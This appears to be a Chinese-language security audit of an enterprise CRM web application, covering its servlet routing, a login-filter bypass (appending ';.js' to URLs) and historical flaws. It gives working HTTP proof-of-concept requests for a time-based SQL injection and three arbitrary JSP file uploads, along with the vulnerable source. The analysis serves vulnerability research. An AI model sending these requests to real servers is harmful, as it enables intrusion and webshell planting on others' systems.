## 框架分析

deploy文件夹大致结构如下

```
deploy
  ｜- common.war
  ｜- EnterCRMInterface.war
  ｜- entsoft.war
  ｜- entsoft_en.war
  ｜- hornetq 
  ｜- jbossweb.sar
  ｜- jms-ra.rar
  ｜- mod_cluster.sar
  ｜- security
  ｜- 各种jar
  ｜- 各种xml配置文件
```

关注部署的war包来搞源码。每个war包中都包含了`web.xml`并且`<display-name>`都是`entCRM`。可以判定这四个war包之间属于一套系统。

```xml
<web-app>
  <display-name>entCRM</display-name>
</web-app>
```

### 核心路由

web.xml中除了定义了具体的路由，如`<url-pattern>/entslt/T0191</url-pattern>`，还有八个通配符定义的路由，这也是我们关注的重点。

```xml
  <servlet>
    <servlet-name>webcontrol</servlet-name>
    <servlet-class>entslt.WebControl</servlet-class>  <!-- 定义了34个可以调用的Action，位于tradebase.jar--> 
  </servlet>
  <servlet-mapping>
    <servlet-name>webcontrol</servlet-name>
    <url-pattern>*.entsoft</url-pattern>
  </servlet-mapping>
  <servlet>
    <servlet-name>entasp</servlet-name>
    <servlet-class>entaspslt.AspControl</servlet-class> <!-- 对应的HireAccInfoForAspAction，enterasp.jar-->
  </servlet>
  <servlet-mapping>
    <servlet-name>entasp</servlet-name>
    <url-pattern>*.entasp</url-pattern>
  </servlet-mapping>
  <servlet>
    <servlet-name>entweb</servlet-name>
    <servlet-class>entslt.EntWebControl</servlet-class> <!-- 定义了43个可以调用的Action，位于tradebase.jar--> 
  </servlet>
  <servlet-mapping>
    <servlet-name>entweb</servlet-name>
    <url-pattern>*.entweb</url-pattern>
  </servlet-mapping>
  <servlet>
    <servlet-name>entcrm</servlet-name>
    <servlet-class>entslt.EntCrmControl</servlet-class> <!-- 定义了26个可以调用的Action，位于crmbase.jar--> 
  </servlet>
  <servlet-mapping>
    <servlet-name>entcrm</servlet-name>
    <url-pattern>*.entcrm</url-pattern>
  </servlet-mapping>
  <servlet>
    <servlet-name>emrser</servlet-name>
    <servlet-class>entslt.EmailMarkControl</servlet-class> <!-- 定义了4个可以调用的Action，位于crmbase.jar和tradebase.jar--> 
  </servlet>
  <servlet-mapping>
    <servlet-name>emrser</servlet-name>
    <url-pattern>*.emrser</url-pattern>
  </servlet-mapping>  
  <servlet>
    <servlet-name>entPhone</servlet-name>
    <servlet-class>enterphone.EntPhoneControl</servlet-class> <!-- 定义了18个可以调用的Action，enterphone.jar和entcgi.jar--> 
  </servlet>
  <servlet-mapping>
    <servlet-name>entPhone</servlet-name>
    <url-pattern>*.entphone</url-pattern>
  </servlet-mapping>
  <servlet>
    <servlet-name>DingdingServlet</servlet-name>
    <servlet-class>com.alibaba.dingtalk.openapi.servlet.DingdingServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>DingdingServlet</servlet-name>
    <url-pattern>*.isv</url-pattern>
  </servlet-mapping>
  <servlet>
    <servlet-name>entWeixin</servlet-name>
    <servlet-class>entcgi.entweixin.crm.EntWeixinControl</servlet-class> <!-- 调用UsrWeixinAction-->
  </servlet>
 <servlet-mapping>
    <servlet-name>entWeixin</servlet-name>
    <url-pattern>*.entweixin</url-pattern>
 </servlet-mapping>
```

以`.entweb`路由为例，它的处理类为`EntWebControl`，部分核心代码如下。根据路由的值，从actionMap中获取对应的类，然后调用该类中的`execute`方法。
```java
public class EntWebControl extends HttpServlet {

    public EntWebControl() {
        this.actionMap.put("T0110_editAction", T0110_editAction.class);
        this.actionMap.put("T0115_editAction", T0115_editAction.class);
        this.actionMap.put("T0125_editAction", T0125_editAction.class);
        this.actionMap.put("Tqtespla_editAction", Tqtespla_editAction.class);
        this.actionMap.put("Quotegask_editAction", Quotegask_editAction.class);
        ...
    }

    public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException {
        String servletpath = request.getServletPath();
        String[] aa = servletpath.split("/");
        int k = aa.length - 1;
        String[] bb = aa[k].split("\\.");
        String action = bb[0];
      ...
        Class webActionClass = (Class)this.actionMap.get(action);
        EntWebAction webAction = (EntWebAction)webActionClass.newInstance();
        webAction.execute(this, request, response);
    }
}
```



### 绕过Filter

除`EnterCRMInterface.war`的`web.xml`，其余的web.xml都包含如下配置。也就是说这套代码所有的路由都经过`PurFilter`的处理

```xml
  <filter>
    <filter-name>purfilter</filter-name>
    <filter-class>filter.PurFilter</filter-class>
  </filter>
  <filter-mapping>
    <filter-name>purfilter</filter-name>
    <url-pattern>/*</url-pattern>
```

`Purfilter.doFilter()`

```java
public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain){
	if (url.indexOf("/enterphone/") == -1) { /*设置cookie*/ }
  if (session.getAttribute("usr_id") == null && !listExptUrl.contains(url) && (strSuffix == null || !listExptFilTyp.contains(strSuffix))) { /*走到这个if最终会return*/ }
  if (isCookieLogin != null && !isCookieLogin.equals("")) {  /*更新数据库的ts_asp_usronline表*/ 
  } else {
    if ("PHONE".equals(isPc) && "/".equals(url) && EntSys.getPhoneRegister().equals("Y")) { /* 重定向*/}
    if ("/phone.jsp".equals(url) && EntSys.getPhoneRegister().equals("Y")) { /*重定向*/}
    if ("/dingdLogin.jsp".equals(url)) { /* 重定向 */}
  }
  if (this.gzipble(httpRequest) && (strSuffix == null || !listWiztGZIP.contains(strSuffix))) {
		filterChain.doFilter(request, wrapper);
    ...
  }else {
    filterChain.doFilter(request, response);
  }
}

```

想要执行到doFilter，不能在之前的if中被return或者被重定向。那么也就需要不满足如下这个if条件

```
if (session.getAttribute("usr_id") == null && !listExptUrl.contains(url) && (strSuffix == null || !listExptFilTyp.contains(strSuffix)))
```

要么url在`listExptUrl`列表中，要么这个url的后缀在`listExptFilTyp`列表中。就可以不满足这个if。而想要访问任意的url最简单的方式就是在路由后面加上`listExptFilTyp`中的后缀

`listExptFilTyp`列表如下

```
.gif | .bmp | .js | .jpg | .css | .html | .cab | .png | .swf | .ico | .dwr | .jpeg
```

`listExptUrl`列表如下

```
/index.jsp
/entsoft/index.jsp
/entsoft/ep/logonctr.jsp
/entsoft_en/ep/logonctr.jsp
/entsoft/ep/logon.jsp
/entsoft/ep/e911.jsp
/entsoft/ep/e911_btm.jsp
/entsoft/module/recSMS.jsp
/entsoft/module/sendSMS.jsp
/entsoft/ep/message.jsp
/entsoft/pda/checklogin.jsp
/entsoft_en/pda/checklogin.jsp
/entsoft/ep/logondocctr.jsp
/HireAccInfoForAspAction.entasp
/entsoft/HireAccInfoForAspAction.entasp
/entsoft/ep/logonSaaS.jsp
/entsoft/DingdingServlet.entcrm
/muser/muser.dat
/ceuser/ceuser.dat
/entsoft/ecp/ecpLogin.jsp
/ecp/ecpLogin.jsp
/entsoft/AirLoginServlet.entcrm
/entsoft/ep/LogInAction.entcrm
/entsoft/supplier/LogInAction.entweb
/entsoft/EtAction.entcrm
/entsoft/entereditor/jsp/fileupload.jsp
/entsoft_en/entereditor/jsp/fileupload.jsp
/services/entsoftInterface
/
/entsoft/LoginAction.entphone
/entsoft/ProductAction.entphone
/phone.jsp
/dingdTransfer.jsp
/dingdTransfer2.jsp
/dingdLogin.jsp
/dingdbound.jsp
/entsoft/enterphone/logout.jsp
/main_online.html
/weixin
/qyweixin
/entsoft/DingdingServlet.isv
/entweixin/entwx-cgi/user/remove
/entweixin/entwx-cgi/message/newmail
/entweixin/binding.html
/entweixin/control.jsp
/ent-cgi/entweixin/user/check
/ent-cgi/entweixin/user/binding
/ent-cgi/entweixin/user/remove
/entsoft/ep/LoginDoAction.entcrm
/entsoft_en/ep/LoginDoAction.entcrm
/ent-cgi/message/getlist
/ent-cgi/customer/getlist
/ent-cgi/goods/getlist
/ent-cgi/goods/getClslist
/ent-cgi/orders/addNewContracts
/ent-cgi/orders/getContract
/ent-cgi/orders/updOrderState
/ent-cgi/notice/cancelNotice
/ent-cgi/shipment/getlist
/ent-cgi/shipment/getShipment
/ent-cgi/shipment/updShipmentState
/ent-cgi/shipment/getShipmentAccount
/ent-cgi/instock/getlist
/ent-cgi/instock/greceiptDocByInstocknum
/ent-cgi/report/salecontractRe
/ent-cgi/report/shipmentRe
/ent-cgi/report/declarationRe
/ent-cgi/report/manufactureRe
/ent-cgi/report/quotationRe
/ent-cgi/report/instockRe
/ent-cgi/report/goodQrcodeRe
/ent-cgi/customer/gescodCheck
/ent-cgi/customer/checkContactData
/ent-cgi/report/querySalecontractRe
/ent-cgi/report/querySalecontracth
/ent-cgi/report/queryManufactured
/ent-cgi/report/shipmentFormRe
/ent-cgi/report/queryCustomer
/ent-cgi/report/queryProduct
/ent-cgi/report/queryShipmentAptoc
/ent-cgi/report/querySampleRegistration
/ent-cgi/report/queryOnePostSample
/ent-cgi/report/queryOnePostSampleForTitle
/ent-cgi/report/queryOnePostSampleOrders
/ent-cgi/report/queryclientFundStatByGS
/ent-cgi/customer/insertOneContact
/ent-cgi/customer/insertOneContacts
/ent-cgi/customer/delContact
/ent-cgi/goods/insertOneGood
/ent-cgi/goods/getGoods
/ent-cgi/goods/insertOneGoods
/ent-cgi/goods/delGood
/ent-cgi/report/queryProfit
/ent-cgi/report/queryMonthlySales
/ent-cgi/report/scanCodeStorage
/ent-cgi/report/queryOrderDetailsList
/enterdoc/Salecontract/
/enterdoc/Salecontract/**
```

## 历史漏洞

| 漏洞名称                                          | 漏洞URI                                         | 
| ------------------------------------------------- | ----------------------------------------------- | 
| T0140_editAction SQL注入漏洞            | /entsoft/T0140_editAction.entweb;.js?method=getdocumentnumFlag&documentnum=1';WAITFOR+DELAY+'0:0:5'--|
| LoginDoAction.entcrm SQL注入漏洞 | /entsoft/ep/LoginDoAction.entcrm |
| MailAction.entphone 任意文件上传漏洞            | /entsoft/MailAction.entphone;.js?act=saveAttaFile           |
| machord_doc.jsp 文件上传漏洞                 | /entsoft_en/Storage/machord_doc.jsp;.js?formID=upload&machordernum=&fileName=4.jsp       |
| fileupload.jsp任意文件上传漏洞 | /entsoft_en/entereditor/jsp/fileupload.jsp?filename=1.jsp    |
| CustomerAction.entphone 任意文件上传漏洞    | /entsoft/CustomerAction.entphone;.js?method=loadFile    |

### T0140_editAction SQL注入漏洞

```
GET /entsoft/T0140_editAction.entweb;.js?method=getdocumentnumFlag&documentnum=1';WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

漏洞位于`tradebase.jar`

```java
package entslt.trade;

public class T0140_editAction extends EntWebAction {
	    public void execute(EntWebControl servlet, HttpServletRequest request, HttpServletResponse response) throws ServletException {

      String method = request.getParameter("method");
        method = Utils.nullToSpace(method);
        if (method.equals("doUpd")) {
            this.doUpd(servlet, request, response);
        }

        if (method.equals("getdocumentnumFlag")) {
            this.getdocumentnumFlag(servlet, request, response);
        }
    }
}
```

跟进`getdocmentnumFlag`，存在明显的sql注入点，并且无结果打印代码。时间盲注测试即可。

```java
private void getdocumentnumFlag(EntWebControl servlet, HttpServletRequest request, HttpServletResponse response) throws ServletException {
    ...
    String documentnum = request.getParameter("documentnum");
    this.documentSes = new DocumentSesBean(tenantID);
    String flag = this.documentSes.getdocumentnumFlag(documentnum);  // 核心会执行下面的sql
}


strSql = "select c_documentnum from tbt_documents where c_documentnum='" + documentnum + "'";
al_Tmp = dbManipulation.execSQL(strSql, 1);
```

### MailAction.entphone 任意文件上传漏洞

```
POST /entsoft/MailAction.entphone;.js?act=saveAttaFile HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A
 
------WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Disposition: form-data; name="file";filename="3.jsp"
Content-Type: image/jpeg
 
<%out.print("test");%>
------WebKitFormBoundarye8FPHsIAq9JN8j2A--
```

漏洞位于`enterphone.jar`

````java
package enterphone.phonecrm;

public class MailAction extends EntPhoneAction {
    public void execute(EntPhoneControl servlet, HttpServletRequest request, HttpServletResponse response) throws ServletException {
        String method = request.getParameter("method");
        String action = request.getParameter("act");
        method = Utils.nullToSpace(method);
        if ("saveAttaFile".equals(action)) {
            this.saveAttaFile(servlet, request, response);
        }
    }
}
````

跟进`saveAttaFile`

```java
public void saveAttaFile(EntPhoneControl servlet, HttpServletRequest request, HttpServletResponse response) {
    String filepath = "enterdoc.war";
    String bodyID = request.getParameter("bodyID");
    String type = request.getParameter("type");
    if (type.equals("otheradd")) {
        strRoot = EntAsp.getEntsoftPath(asp_cod) + "Entsoft/" + filepath + "/entTmp/" + device + "/";
    } else if (type.equals("otherup")) {
        strRoot = EntAsp.getEntsoftPath(asp_cod) + "Entsoft/" + filepath + "/EnterTrk/" + device + "/";
    } else {
        strRoot = EntAsp.getEntsoftPath(asp_cod) + "Entsoft/" + filepath + "/EnterMail/" + strmaildate + "/" + bodyID + "/";
    }
    File dir = new File(strRoot);
    if (!dir.exists()) {  dir.mkdirs();}

    DiskFileItemFactory factory = new DiskFileItemFactory();
    ServletFileUpload upload = new ServletFileUpload(factory);

    try {
        List<FileItem> items = upload.parseRequest(request);
        Iterator iter = items.iterator();
        BufferedImage bi = null;

        while(iter.hasNext()) {
            FileItem item = (FileItem)iter.next();
            if (!item.isFormField()) {
                String fileName = item.getName();
                fileName = fileName.replace("%", "%25");
                fileName = fileName.replace(";", "_");
                File saveFile = new File(strRoot + fileName);
                if (saveFile.exists()) {
                    bi = ImageIO.read(saveFile);
                    if (bi != null) { isImage = true; }
                    json.put("msg", "文件已存在");
                    json.put("fileName", fileName);
                    json.put("path", strRoot + fileName);
                    json.put("isImage", isImage);
                    json.put("visitRoot", visitRoot + fileName);
                 } else {
                    item.write(saveFile);
                    if (saveFile.exists()) {
                        bi = ImageIO.read(saveFile);
                        if (bi != null) { isImage = true; }
                        msg = "上传成功";
                    }
                    json.put("visitRoot", visitRoot + fileName);
                    json.put("msg", msg);
                    json.put("path", strRoot + fileName);
                    json.put("fileName", fileName);
                    json.put("isImage", isImage);
                 }
}
```

响应包内容大致如下

```
{"visitRoot":"http://null/enterdoc/EnterMail/20231117/2023111718393783974019557/3.jsp",
"fileName":"3.jsp",
"path":"D:/Entsoft/enterdoc.war/EnterMail/20231117/2023111718393783974019557/3.jsp",
"isImage":false,
"msg":"上传成功"}
```



### machord_doc.jsp 文件上传漏洞

```
POST /entsoft_en/Storage/machord_doc.jsp;.js?formID=upload&machordernum=&fileName=4.jsp&strAffixStr=&oprfilenam=null&gesnum= HTTP/1.1
Host: your-ip
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQzxXQpKIb1f32N11
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
 
------WebKitFormBoundaryQzxXQpKIb1f32N11
Content-Disposition: form-data; name="oprfilenam"
 
null
------WebKitFormBoundaryQzxXQpKIb1f32N11
Content-Disposition: form-data; name="uploadflg"
 
0
------WebKitFormBoundaryQzxXQpKIb1f32N11
Content-Disposition: form-data; name="strAffixStr"
 
 
------WebKitFormBoundaryQzxXQpKIb1f32N11
Content-Disposition: form-data; name="selfilenam"
 
 
------WebKitFormBoundaryQzxXQpKIb1f32N11
Content-Disposition: form-data; name="uploadfile"; filename="4.jsp"
Content-Type: image/png
 
<%out.print("test-PoC-4");%>
------WebKitFormBoundaryQzxXQpKIb1f32N11--
```

响应的jsp页面包含如下字段

```jsp
<a id="doc0" ondblclick="javascript:openbyStream('/enterdoc/Machord//4.jsp','4.jsp')" ..>
```


`machord_doc.jsp`核心内容如下

```jsp
<jsp:useBean id="mySmartUpload" scope="page" class="com.jspsmart.upload.SmartUpload" />
<INPUT TYPE="FILE" NAME="uploadfile" class="editenttxt">
<%
	if(fileName!=null&&fileName.equals("")==false&&formID!=null&&formID.equals("upload")){
		String syspath = optSesEJB.getOptVal((String)session.getAttribute("CST_ID"),"DOCINFFILSYSDFTPTH");
		String strRoot=  syspath + "/Machord" + "/" + machordernum ; 
		java.io.File dir = new java.io.File(strRoot);
		if (dir.exists() == false)dir.mkdirs();
		mySmartUpload.initialize(pageContext);
		mySmartUpload.upload(); //进行上传操作
		mySmartUpload.save(syspath + "/Machord" + "/" + machordernum );
  }
%>
```



### CustomerAction.entphone 任意文件上传漏洞

```
POST /entsoft/CustomerAction.entphone;.js?method=loadFile HTTP/1.1
Host: IP:PORT
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflateCookie: JSESSIONID=DC8CC6789589F9B682E313C4D1A2D398DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Length: 232

------WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Disposition: form-data; name="file";filename="xx.jsp"
Content-Type: image/jpeg

<%out.print("test");%>
------WebKitFormBoundarye8FPHsIAq9JN8j2A--
```

响应如下

```
{"returnflg":"2.jsp", "gesnum":"00002488","filepath":"/enterdoc/gesnum/00002488/photo/2.jsp"}
```

漏洞定位`enterphone.jar`。

```java
package enterphone.phonecrm;

public class CustomerAction extends EntPhoneAction {
   public void execute(EntPhoneControl servlet, HttpServletRequest request, HttpServletResponse response) throws ServletException {
       if ("loadFile".equals(method)) {
           this.loadFile(servlet, request, response);
       }
   }
}

    public void loadFile(EntPhoneControl servlet, HttpServletRequest request, HttpServletResponse response) {
        String uploadPath = EntAsp.getEntsoftPath(this.tenantID) + "Entsoft\\" + filepath + "\\gesnum\\" + gesnum + "\\photo\\";
        boolean isMultipart = ServletFileUpload.isMultipartContent(request);
        if (isMultipart) {
            FileItemFactory factory = new DiskFileItemFactory();
            ServletFileUpload upload = new ServletFileUpload(factory);
            Iterator items = upload.parseRequest(request).iterator();

            label57:
            while(true) {
                FileItem item;
                do {
                    if (!items.hasNext()) { break label57; }
                    item = (FileItem)items.next();
                } while(item.isFormField());

                name = item.getName();
                File uploaderFile = new File(uploadPath + name);
                File file1 = new File(EntAsp.getEntsoftPath(this.tenantID) + "Entsoft\\" + filepath + "\\gesnum\\" + gesnum);
                File file2 = new File(uploadPath);
                if (!file1.exists()) { file1.mkdirs(); }
                if (!file2.exists()) { file2.mkdirs(); }
                File[] list = file2.listFiles();

                for(int i = 0; i < list.length; ++i) {
                    list[i].delete();
                }

                item.write(uploaderFile);
            }
        }
```

